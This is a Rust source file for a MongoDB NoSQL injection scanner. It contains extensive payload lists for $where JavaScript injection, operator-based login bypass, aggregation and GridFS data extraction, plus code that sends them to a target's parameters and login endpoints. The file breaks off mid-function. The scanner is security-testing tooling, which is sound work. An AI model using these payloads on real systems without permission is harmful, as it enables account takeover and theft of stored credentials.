//! MongoDB NoSQL Injection Scanner
//!
//! Detects MongoDB/NoSQL injection vulnerabilities in web applications.
//! Tests for:
//! - NoSQL injection via $where, $ne, $regex operators
//! - Authentication bypass attempts
//! - JavaScript injection in MongoDB queries
//! - Operator abuse ($nin, $in, $gt, $lt)
//! - Aggregation pipeline injection
//! - GridFS abuse
//!
//! SECURITY: This scanner tests ONLY against the provided target URL.
//! All payloads are designed for security testing purposes.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::Duration;

// ============================================================================
// NoSQL INJECTION PAYLOADS
// ============================================================================

/// $where operator injection payloads - execute JavaScript
const WHERE_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Basic $where injection
    ("' || 1==1 || '", "where_basic_true", VulnSeverity::Critical),
    ("' || ''=='", "where_empty_string", VulnSeverity::Critical),
    ("'; return 'true'", "where_return_true", VulnSeverity::Critical),
    ("' || this.password == 'password' || '", "where_password_check", VulnSeverity::Critical),
    ("' || this.username == 'admin' || '", "where_admin_check", VulnSeverity::Critical),
    ("' || this.isAdmin == true || '", "where_admin_flag", VulnSeverity::Critical),

    // Complex $where with JavaScript
    ("' || (function(){return true})() || '", "where_function_call", VulnSeverity::Critical),
    ("' || (Math.random() > 0) || '", "where_math_bypass", VulnSeverity::Critical),
    ("' || this.password.match(/./) || '", "where_regex_match", VulnSeverity::Critical),
    ("' || this.password!==null || '", "where_not_null", VulnSeverity::Critical),
    ("' || this.password.length>0 || '", "where_length_check", VulnSeverity::Critical),

    // $where with timing
    ("' || (function(){sleep(1000)})() || '", "where_timing", VulnSeverity::High),
    ("' || (new Date().getTime()) || '", "where_date", VulnSeverity::High),

    // $where with data exfiltration
    ("' || this.password || '", "where_password_leak", VulnSeverity::Critical),
    ("' || this.email || '", "where_email_leak", VulnSeverity::Critical),
    ("' || tojson(this) || '", "where_tojson_leak", VulnSeverity::Critical),
    ("' || Object.keys(this) || '", "where_keys_leak", VulnSeverity::Critical),
];

/// $ne (not equal) operator for authentication bypass
const NE_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Basic $ne bypass
    ("' || $ne != null", "ne_not_null", VulnSeverity::Critical),
    ("' || $ne != 'x'", "ne_not_equal", VulnSeverity::Critical),
    ("' || $ne == $ne", "ne_self_equal", VulnSeverity::Critical),
    ("' || $ne !== ''", "ne_not_empty", VulnSeverity::Critical),

    // Authentication bypass with $ne
    ("admin' || $ne != null", "ne_admin_bypass", VulnSeverity::Critical),
    ("' || $ne != 'invalidpassword'", "ne_password_bypass", VulnSeverity::Critical),
    ("' || $ne == null || '", "ne_null_bypass", VulnSeverity::Critical),

    // $ne in nested objects
    ("' || $where:'true' || $ne:null", "ne_mixed_where", VulnSeverity::Critical),
    ("' || $ne: null || $regex: '.*'", "ne_mixed_regex", VulnSeverity::Critical),
];

/// $regex operator injection payloads
const REGEX_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Basic regex bypass
    ("' || $regex: '.*'", "regex_match_all", VulnSeverity::Critical),
    ("' || $regex: '.*.*'", "regex_double_wildcard", VulnSeverity::Critical),
    ("' || $regex: 'a.*'", "regex_partial", VulnSeverity::High),
    ("' || $regex: '.*'", "regex_wildcard", VulnSeverity::Critical),

    // Case insensitive regex
    ("' || $regex: '.*', $options: 'i'", "regex_case_insensitive", VulnSeverity::High),
    ("' || $regex: 'admin', $options: 'i'", "regex_admin_ci", VulnSeverity::High),

    // Multiline regex
    ("' || $regex: '.*', $options: 'm'", "regex_multiline", VulnSeverity::Medium),
    ("' || $regex: '.*', $options: 's'", "regex_singleline", VulnSeverity::Medium),

    // Extended regex
    ("' || $regex: '.*', $options: 'x'", "regex_extended", VulnSeverity::Medium),

    // Regex with character classes
    ("' || $regex: '[a-zA-Z0-9]*'", "regex_char_class", VulnSeverity::High),
    ("' || $regex: '[\\w\\d]*'", "regex_word_class", VulnSeverity::High),

    // Regex negation
    ("' || $regex: '[^x]*'", "regex_negation", VulnSeverity::High),
    ("' || $not: $regex: 'x'", "regex_not", VulnSeverity::High),

    // Regex OR bypass
    ("' || $regex: '(a|b|c).*'", "regex_or", VulnSeverity::High),
    ("' || $in: ['admin', 'user']", "in_admin_bypass", VulnSeverity::Critical),
];

/// Operator abuse payloads
const OPERATOR_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // $in operator
    ("' || $in: [1,2,3,4,5,6,7,8,9,0]", "in_numeric_array", VulnSeverity::High),
    ("' || $in: ['admin', 'user', 'test']", "in_string_array", VulnSeverity::Critical),
    ("' || $in: [null, '']", "in_null_empty", VulnSeverity::High),

    // $nin operator
    ("' || $nin: []", "nin_empty", VulnSeverity::High),
    ("' || $nin: ['invalid']", "nin_invalid", VulnSeverity::High),
    ("' || $nin: ['x']", "nin_single", VulnSeverity::High),

    // $gt (greater than)
    ("' || $gt: null", "gt_null", VulnSeverity::High),
    ("' || $gt: ''", "gt_empty", VulnSeverity::High),
    ("' || $gt: -999999", "gt_negative", VulnSeverity::High),

    // $lt (less than)
    ("' || $lt: 999999", "lt_large", VulnSeverity::High),
    ("' || $lt: 'zzzzzz'", "lt_string", VulnSeverity::High),

    // $gte (greater than or equal)
    ("' || $gte: ''", "gte_empty", VulnSeverity::High),
    ("' || $gte: 0", "gte_zero", VulnSeverity::High),

    // $lte (less than or equal)
    ("' || $lte: '~~~~~~'", "lte_tilde", VulnSeverity::High),
    ("' || $lte: 999999", "lte_large", VulnSeverity::High),

    // $exists operator
    ("' || $exists: true", "exists_true", VulnSeverity::Medium),
    ("' || $exists: false", "exists_false", VulnSeverity::Medium),

    // $type operator
    ("' || $type: 2", "type_string", VulnSeverity::Medium),
    ("' || $type: 10", "type_null", VulnSeverity::Medium),

    // $mod operator
    ("' || $mod: [1, 0]", "mod_bypass", VulnSeverity::High),
    ("' || $mod: [2, 1]", "mod_odd", VulnSeverity::High),

    // $size operator
    ("' || $size: 0", "size_empty", VulnSeverity::Medium),
    ("' || $size: {$gt: -1}", "size_gt", VulnSeverity::High),

    // $all operator
    ("' || $all: []", "all_empty", VulnSeverity::Medium),
    ("' || $all: [{})", "all_partial", VulnSeverity::Medium),

    // $elemMatch operator
    ("' || $elemMatch: {$ne: null}", "elemmatch_ne", VulnSeverity::High),

    // $not operator
    ("' || $not: null", "not_null", VulnSeverity::High),
    ("' || $not: {$type: 10}", "not_type", VulnSeverity::High),

    // Combination operators
    ("' || $or: [{}, {}]", "or_empty", VulnSeverity::High),
    ("' || $and: [{$ne: null}, {$ne: ''}]", "and_ne", VulnSeverity::High),
    ("' || $nor: [{}, {}]", "nor_empty", VulnSeverity::Medium),
];

/// JavaScript injection payloads
const JS_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Direct JavaScript
    ("' || 'a'=='a'", "js_string_compare", VulnSeverity::Critical),
    ("' || 1==1 || '", "js_numeric_compare", VulnSeverity::Critical),
    ("' || true || '", "js_boolean_true", VulnSeverity::Critical),
    ("' || false || '", "js_boolean_false", VulnSeverity::High),

    // JavaScript functions
    ("' || Math.max(1,2) || '", "js_math_function", VulnSeverity::High),
    ("' || Date.now() || '", "js_date_function", VulnSeverity::High),
    ("' || isNaN(undefined) || '", "js_isnan", VulnSeverity::High),

    // $function operator (MongoDB 4.4+)
    ("' || $function: 'function(){return true}'", "function_return", VulnSeverity::Critical),
    ("' || $function: 'function(){return this.password}'", "function_leak", VulnSeverity::Critical),
    ("' || $accumulator: 'function(){return true}'", "accumulator", VulnSeverity::High),

    // $expr operator
    ("' || $expr: {$eq: [true, true]}", "expr_eq", VulnSeverity::High),
    ("' || $expr: {$const: true}", "expr_const", VulnSeverity::High),

    // eval-like patterns
    ("' || eval('true') || '", "js_eval", VulnSeverity::Critical),
    ("' || Function('return true')() || '", "js_function_constructor", VulnSeverity::Critical),

    // String manipulation
    ("' || 'test'.length > 0 || '", "js_length", VulnSeverity::High),
    ("' || 'admin'.includes('a') || '", "js_includes", VulnSeverity::High),
    ("' || 'test'.substring(0) || '", "js_substring", VulnSeverity::High),

    // Type coercion
    ("' || '1' == 1 || '", "js_type_coercion", VulnSeverity::High),
    ("' || '0' == false || '", "js_boolean_coercion", VulnSeverity::High),
    ("' || undefined == null || '", "js_null_coercion", VulnSeverity::High),

    // Array manipulation
    ("' || [].length == 0 || '", "js_array_empty", VulnSeverity::High),
    ("' || [1].pop() || '", "js_array_pop", VulnSeverity::High),
];

/// Authentication bypass payloads
const AUTH_BYPASS_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Username bypass
    ("admin' || $ne != null #", "auth_username_ne", VulnSeverity::Critical),
    ("admin' || $regex: '.*' #", "auth_username_regex", VulnSeverity::Critical),
    ("admin' || 'a'=='a' #", "auth_username_js", VulnSeverity::Critical),
    ("admin' || true #", "auth_username_true", VulnSeverity::Critical),
    ("admin' || 1==1 #", "auth_username_compare", VulnSeverity::Critical),

    // Password bypass
    ("password' || $ne != null #", "auth_password_ne", VulnSeverity::Critical),
    ("password' || $ne != 'invalid' #", "auth_password_ne_invalid", VulnSeverity::Critical),
    ("password' || $regex: '.*' #", "auth_password_regex", VulnSeverity::Critical),
    ("password' || '' == '' #", "auth_password_empty", VulnSeverity::Critical),

    // Empty password attempts
    ("", "empty_password_1", VulnSeverity::High),
    ("' || '' #", "empty_password_2", VulnSeverity::High),
    ("' || $ne == null #", "empty_password_3", VulnSeverity::High),

    // Null bypass
    ("null", "null_password", VulnSeverity::High),
    ("' || null #", "null_injection", VulnSeverity::High),

    // Role manipulation
    ("' || $set: {role: 'admin'} #", "role_set_admin", VulnSeverity::Critical),
    ("' || $set: {isAdmin: true} #", "role_set_isadmin", VulnSeverity::Critical),
    ("' || $push: {roles: 'admin'} #", "role_push_admin", VulnSeverity::Critical),

    // JSON-based auth bypass
    (r#"{"username": {"$ne": null}, "password": {"$ne": null}}"#, "json_auth_ne", VulnSeverity::Critical),
    (r#"{"username": "admin", "password": {"$ne": null}}"#, "json_admin_ne", VulnSeverity::Critical),
    (r#"{"$where": "true"}"#, "json_where", VulnSeverity::Critical),
    (r#"{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}"#, "json_or_bypass", VulnSeverity::Critical),
];

/// Aggregation pipeline injection payloads
const AGGREGATION_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // $lookup for data exfiltration
    ("' || $lookup: {from: 'users', localField: 'x', foreignField: 'x', as: 'y'} || '", "lookup_users", VulnSeverity::Critical),
    ("' || $lookup: {from: 'passwords', localField: 'x', foreignField: 'x', as: 'y'} || '", "lookup_passwords", VulnSeverity::Critical),
    ("' || $lookup: {from: 'admin', localField: 'x', foreignField: 'x', as: 'y'} || '", "lookup_admin", VulnSeverity::Critical),

    // $project for field projection
    ("' || $project: {password: 1, email: 1} || '", "project_sensitive", VulnSeverity::High),
    ("' || $project: {password: 1} || '", "project_password", VulnSeverity::Critical),

    // $match for filtering
    ("' || $match: {isAdmin: true} || '", "match_admin", VulnSeverity::High),
    ("' || $match: {$where: 'true'} || '", "match_where", VulnSeverity::Critical),

    // $group for aggregation
    ("' || $group: {_id: null, count: {$sum: 1}} || '", "group_count", VulnSeverity::Medium),
    ("' || $group: {_id: '$password'} || '", "group_password", VulnSeverity::Critical),

    // $unwind for array flattening
    ("' || $unwind: '$password' || '", "unwind_password", VulnSeverity::High),

    // $redact for access control bypass
    ("' || $redact: {$cond: {if: true, then: '$$KEEP', else: '$$PRUNE'}} || '", "redact_keep", VulnSeverity::High),

    // Pipeline abuse
    ("[{$where: 'true'}]", "pipeline_where", VulnSeverity::Critical),
    ("[{$match: {$ne: null}}]", "pipeline_match_ne", VulnSeverity::High),
    ("[{$project: {password: 1}}]", "pipeline_project", VulnSeverity::High),
];

/// GridFS abuse payloads
const GRIDFS_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Path traversal via GridFS
    ("' || $lookup: {from: 'fs.files', localField: 'x', foreignField: 'x', as: 'y'} || '", "gridfs_files", VulnSeverity::High),
    ("' || $lookup: {from: 'fs.chunks', localField: 'x', foreignField: 'x', as: 'y'} || '", "gridfs_chunks", VulnSeverity::High),

    // GridFS metadata access
    ("' || $match: {contentType: 'application/pdf'} || '", "gridfs_pdf", VulnSeverity::Medium),
    ("' || $match: {filename: {$regex: '.*'}} || '", "gridfs_filename", VulnSeverity::High),

    // Sensitive file patterns
    ("' || $match: {filename: {$in: ['config', 'env', 'credentials']}} || '", "gridfs_sensitive", VulnSeverity::Critical),
    ("' || $match: {filename: {$regex: '\\.(key|pem|cert)'}} || '", "gridfs_certs", VulnSeverity::Critical),

    // GridFS chunk enumeration
    ("' || $project: {data: 1} || '", "gridfs_data", VulnSeverity::High),
    ("' || $limit: 1 || '", "gridfs_limit", VulnSeverity::Low),
    ("' || $skip: 0 || '", "gridfs_skip", VulnSeverity::Low),
];

/// BSON manipulation payloads
const BSON_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // BSON type manipulation
    ("' || {$type: 'string'} || '", "bson_string", VulnSeverity::Medium),
    ("' || {$type: 'object'} || '", "bson_object", VulnSeverity::Medium),
    ("' || {$type: 'array'} || '", "bson_array", VulnSeverity::Medium),

    // Nested objects
    ("' || {$or: [{$and: [{$ne: null}, {$ne: ''}]}]} || '", "bson_nested", VulnSeverity::High),
    ("' || {$a: {$b: {$c: {$ne: null}}}} || '", "bson_deep_nest", VulnSeverity::Medium),

    // Duplicate keys (last wins in MongoDB)
    ("' || {password: 'x', password: {$ne: null}} || '", "bson_duplicate", VulnSeverity::High),

    // Maximum key length test
    ("' || {aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 'x'} || '", "bson_max_key", VulnSeverity::Low),
];

/// Common parameter names for NoSQL injection testing
const NOSQL_PARAMS: &[&str] = &[
    "username", "user", "email", "login", "name",
    "password", "pass", "pwd", "passwd",
    "search", "query", "q", "filter", "find",
    "id", "userId", "accountId", "customerId",
    "role", "roles", "permission", "permissions",
    "status", "state", "active", "enabled",
];

/// Success signatures indicating NoSQL injection
const NOSQL_SUCCESS_SIGNATURES: &[&str] = &[
    // Authentication success indicators
    "welcome", "dashboard", "logout", "profile", "settings",
    "welcome back", "hello,", "hi,", "logged in as",

    // Error messages indicating NoSQL
    "MongoError", "MongoServerError",
    "CastError", "ValidationError",
    "cannot use $where",
    "unknown operator", "unknown top level operator",
    "$where is not allowed",
    "failed because option use",
    "can't use $in with",

    // Data leakage indicators
    "password", "email", "secret", "token", "key",
    "\"password\":", "\"email\":", "\"secret\":",
    "{\"username\":", "{\"_id\":",

    // JSON error responses
    "\"error\": false", "\"success\": true",
    "\"authenticated\":", "\"loggedIn\":",
];

/// Error signatures indicating NoSQL vulnerability
const NOSQL_ERROR_SIGNATURES: &[&str] = &[
    "MongoError",
    "MongoServerError",
    "BSON",
    "E11000", // Duplicate key error
    "Path `", // Mongoose path error
    "Cast to",
    "ValidatorError",
    "ValidationError",
    "TypeError",
    "Cannot read property",
    "is not defined",
];

pub struct MongoScanner {
    client: Client,
    config: ScannerConfig,
}

impl MongoScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(10);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(3))
            .build()
            .expect("Failed to create HTTP client for MongoDB scanner");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Always perform basic NoSQL injection checks
        report.merge(self.test_where_injection(url).await?);
        report.merge(self.test_ne_injection(url).await?);
        report.merge(self.test_regex_injection(url).await?);
        report.merge(self.test_auth_bypass(url).await?);

        // Aggressive mode: extended tests
        if self.config.aggressive {
            report.merge(self.test_operator_abuse(url).await?);
            report.merge(self.test_js_injection(url).await?);
            report.merge(self.test_aggregation_injection(url).await?);
            report.merge(self.test_gridfs_abuse(url).await?);
            report.merge(self.test_bson_manipulation(url).await?);
            report.merge(self.test_json_payloads(url).await?);
        }

        Ok(report)
    }

    /// Test $where operator injection
    async fn test_where_injection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in WHERE_PAYLOADS.iter().take(10) {
            for param in NOSQL_PARAMS.iter().take(5) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_nosql_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Injection: $where Operator ({})", technique),
                            description: format!(
                                "NoSQL injection via $where operator detected. \
                                 The application accepts user input in MongoDB queries without proper sanitization. \
                                 Payload: {}",
                                payload
                            ),
                            location: Some(format!("{} via parameter: {}", test_url, param)),
                            recommendation: Some(
                                "Never use $where operator with user input. \
                                 Use typed query builders. \
                                 Sanitize all user input. \
                                 Use parameterized queries where available.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A03:2021 - Injection".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test $ne operator injection
    async fn test_ne_injection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in NE_PAYLOADS.iter().take(8) {
            for param in NOSQL_PARAMS.iter().take(5) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_nosql_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Injection: $ne Operator ({})", technique),
                            description: format!(
                                "NoSQL injection via $ne (not equal) operator detected. \
                                 Can be used for authentication bypass. \
                                 Payload: {}",
                                payload
                            ),
                            location: Some(format!("{} via parameter: {}", test_url, param)),
                            recommendation: Some(
                                "Validate input strictly. \
                                 Use typed query builders. \
                                 Implement proper authentication mechanisms. \
                                 Check for exact matches, not inequality operators.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test $regex operator injection
    async fn test_regex_injection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in REGEX_PAYLOADS.iter().take(10) {
            for param in NOSQL_PARAMS.iter().take(5) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_nosql_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Injection: $regex Operator ({})", technique),
                            description: format!(
                                "NoSQL injection via $regex operator detected. \
                                 Can be used to match arbitrary patterns. \
                                 Payload: {}",
                                payload
                            ),
                            location: Some(format!("{} via parameter: {}", test_url, param)),
                            recommendation: Some(
                                "Reject special characters like $ and {. \
                                 Use whitelist validation for input. \
                                 Avoid accepting regex patterns from user input.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A03:2021 - Injection".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test authentication bypass
    async fn test_auth_bypass(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test login endpoints
        let login_endpoints = &["/login", "/auth/login", "/api/login", "/signin", "/auth/signin"];

        for (payload, technique, severity) in AUTH_BYPASS_PAYLOADS.iter().take(15) {
            for endpoint in login_endpoints {
                let login_url = if base_url.ends_with('/') {
                    format!("{}{}", base_url, endpoint.trim_start_matches('/'))
                } else {
                    format!("{}{}", base_url, endpoint)
                };

                // Try POST to login endpoint
                let form_data = &[("username", "admin"), ("password", payload)];

                if let Ok(response) = self.client
                    .post(&login_url)
                    .form(form_data)
                    .send()
                    .await
                {
                    if self.check_auth_bypass_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Authentication Bypass ({})", technique),
                            description: format!(
                                "Authentication bypass via NoSQL injection detected. \
                                 The login form is vulnerable to NoSQL injection. \
                                 Payload: {}",
                                payload
                            ),
                            location: Some(format!("{} POST: password={}", login_url, technique)),
                            recommendation: Some(
                                "Use parameterized queries for authentication. \
                                 Implement proper password hashing (bcrypt, argon2). \
                                 Validate input types strictly. \
                                 Use ORM/ODM with proper sanitization.".to_string()
                            ),
                            cwe: Some("CWE-287".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test MongoDB operator abuse
    async fn test_operator_abuse(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in OPERATOR_PAYLOADS.iter().take(20) {
            for param in NOSQL_PARAMS.iter().take(5) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_nosql_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Injection: Operator Abuse ({})", technique),
                            description: format!(
                                "NoSQL injection via MongoDB operator abuse detected. \
                                 Operator: {}",
                                technique
                            ),
                            location: Some(format!("{} via parameter: {}", test_url, param)),
                            recommendation: Some(
                                "Block MongoDB operators ($ prefix) in user input. \
                                 Use typed query builders. \
                                 Implement input validation whitelist.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A03:2021 - Injection".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test JavaScript injection
    async fn test_js_injection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in JS_PAYLOADS.iter().take(15) {
            for param in NOSQL_PARAMS.iter().take(5) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_nosql_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Injection: JavaScript ({})", technique),
                            description: format!(
                                "JavaScript injection in MongoDB query detected. \
                                 This allows execution of arbitrary JavaScript. \
                                 Payload: {}",
                                payload
                            ),
                            location: Some(format!("{} via parameter: {}", test_url, param)),
                            recommendation: Some(
                                "Disable JavaScript execution in MongoDB ($where, $function). \
                                 Use security-safe JavaScript settings. \
                                 Never construct queries from user input.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A03:2021 - Injection".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test aggregation pipeline injection
    async fn test_aggregation_injection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in AGGREGATION_PAYLOADS.iter().take(10) {
            // Test with JSON content-type
            let json_body = format!(r#"{{"query": {}}}"#, payload);

            if let Ok(response) = self.client
                .post(base_url)
                .header("content-type", "application/json")
                .body(json_body)
                .send()
                .await
            {
                if self.check_nosql_response(response, technique).await {
                    report.add_finding(Vuln {
                        severity: *severity,
                        title: format!("NoSQL Injection: Aggregation Pipeline ({})", technique),
                        description: format!(
                            "Aggregation pipeline injection detected. \
                             Can be used for data exfiltration via $lookup, $project. \
                             Payload: {}",
                            payload
                        ),
                        location: Some(format!("{} POST: query={}", base_url, technique)),
                        recommendation: Some(
                            "Validate aggregation pipeline structure. \
                             Block dangerous operators like $lookup in user queries. \
                             Use strict schema validation.".to_string()
                        ),
                        cwe: Some("CWE-943".to_string()),
                        owasp: Some("A03:2021 - Injection".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }

    /// Test GridFS abuse
    async fn test_gridfs_abuse(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in GRIDFS_PAYLOADS.iter().take(8) {
            for param in NOSQL_PARAMS.iter().take(3) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_nosql_response(response, technique).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("NoSQL Injection: GridFS Abuse ({})", technique),
                            description: format!(
                                "GridFS abuse detected. Attempting to access stored files. \
                                 Payload: {}",
                                payload
                            ),
                            location: Some(format!("{} via parameter: {}", test_url, param)),
                            recommendation: Some(
                                "Restrict access to fs.files and fs.chunks collections. \
                                 Implement file access controls. \
                                 Validate file access requests.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test BSON manipulation
    async fn test_bson_manipulation(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in BSON_PAYLOADS.iter().take(6) {
            let test_url = if base_url.contains('?') {
                format!("{}&query={}", base_url, urlencoding::encode(payload))
            } else {
                format!("{}?query={}", base_url, urlencoding::encode(payload))
            };

            if let Ok(response) = self.client.get(&test_url).send().await {
                if self.check_nosql_response(response, technique).await {
                    report.add_finding(Vuln {
                        severity: *severity,
                        title: format!("NoSQL Injection: BSON Manipulation ({})", technique),
                        description: format!(
                            "BSON manipulation detected. Attempting to manipulate document structure. \
                             Payload: {}",
                            payload
                        ),
                        location: Some(test_url),
                        recommendation: Some(
                            "Validate BSON document structure. \
                             Reject nested objects in unexpected places. \
                             Use strict schema validation.".to_string()
                        ),
                        cwe: Some("CWE-943".to_string()),
                        owasp: Some("A03:2021 - Injection".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }

    /// Test JSON-based payloads
    async fn test_json_payloads(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        let json_tests = &[
            (r#"{"username": {"$ne": null}, "password": {"$ne": null}}"#, "json_ne_both", VulnSeverity::Critical),
            (r#"{"$where": "return true"}"#, "json_where_true", VulnSeverity::Critical),
            (r#"{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}"#, "json_or_bypass", VulnSeverity::Critical),
            (r#"{"username": "admin", "password": {"$regex": ".*"}}"#, "json_regex_bypass", VulnSeverity::Critical),
            (r#"{"$ne": null}"#, "json_ne_simple", VulnSeverity::High),
        ];

        for (json_payload, technique, severity) in json_tests {
            if let Ok(response) = self.client
                .post(base_url)
                .header("content-type", "application/json")
                .body(*json_payload)
                .send()
                .await
            {
                if self.check_nosql_response(response, technique).await {
                    report.add_finding(Vuln {
                        severity: *severity,
                        title: format!("NoSQL Injection: JSON Payload ({})", technique),
                        description: format!(
                            "NoSQL injection via JSON payload detected. \
                             Payload: {}",
                            json_payload
                        ),
                        location: Some(format!("{} POST: {}", base_url, technique)),
                        recommendation: Some(
                            "Validate JSON structure. \
                             Block MongoDB operators in JSON. \
                             Use strict typing for all fields.".to_string()
                        ),
                        cwe: Some("CWE-943".to_string()),
                        owasp: Some("A03:2021 - Injection".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }

    /// Check if response indicates NoSQL injection
    async fn check_nosql_response(&self, response: reqwest::Response, technique: &str) -> bool {
        let status = response.status();
        let text_opt = response.text().await;
        let text = text_opt.unwrap_or_default();
        let text_lower = text.to_lowercase();

        // Check for authentication success
        for signature in NOSQL_SUCCESS_SIGNATURES {
            if text_lower.contains(signature) {
                return true;
            }
        }

        // Check for NoSQL error messages (vulnerability confirmed)
        for signature in NOSQL_ERROR_SIGNATURES {
            if text.contains(signature) || text_lower.contains(&signature.to_lowercase()) {
                return true;
            }
        }

        // Check for JSON data leakage
        if text.contains("\"") && (text.contains("password") || text.contains("email") || text.contains("secret")) {
            return true;
        }

        // Check for successful response with injection payload
        if status.is_success() && (technique.contains("true") || technique.contains("bypass")) {
            // Additional verification needed to avoid false positives
            if text_lower.contains("welcome") || text_lower.contains("success") {
                return true;
            }
        }

        // Check for MongoDB-specific responses
        if text.contains("\"_id\"") || text.contains("\"$oid\"") || text.contains("\"$date\"") {
            return true;
        }

        false
    }

    /// Check if response indicates authentication bypass
    async fn check_auth_bypass_response(&self, response: reqwest::Response, technique: &str) -> bool {
        let status = response.status();
        let text_opt = response.text().await;
        let text = text_opt.unwrap_or_default();
        let text_lower = text.to_lowercase();

        // Check for authentication success
        if text_lower.contains("welcome")
            || text_lower.contains("dashboard")
            || text_lower.contains("logout")
            || text_lower.contains("profile")
        {
            return true;
        }

        // Check for JSON success response
        if text.contains("\"authenticated\":true")
            || text.contains("\"loggedIn\":true")
            || text.contains("\"success\":true")
        {
            return true;
        }

        // Check for token/cookie issuance
        if text_lower.contains("token") || text_lower.contains("set-cookie") {
            return true;
        }

        // Check for status code that might indicate bypass
